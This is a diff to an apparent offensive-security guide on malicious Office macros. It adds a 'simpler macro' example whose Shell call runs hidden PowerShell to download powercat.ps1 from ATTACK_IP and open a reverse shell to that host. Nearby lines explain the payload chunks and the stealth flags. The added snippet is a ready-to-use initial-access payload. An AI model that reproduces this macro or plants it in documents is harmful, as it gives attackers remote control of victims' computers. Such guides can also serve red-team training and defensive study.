@@ -103,6 +103,12 @@ Open the generated HTA file (evil.hta) and copy the payload (it is the Base64 en
         Shell Str, 1
     End Sub
 
+### Simpler macro code example
+
+    Sub Main
+    Shell("cmd /c powershell IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACK_IP/powercat.ps1');powercat -c ATTACK_IP -p PORT -e powershell")
+    End Sub
+
 Replace <INSERT_YOUR_PAYLOAD_CHUNKS> with the output from the Python script.
 
 Explanation: The macro creates a PowerShell command to run the payload (-nop for non-interactive, -w hidden for stealth) and executes it using the Shell function.
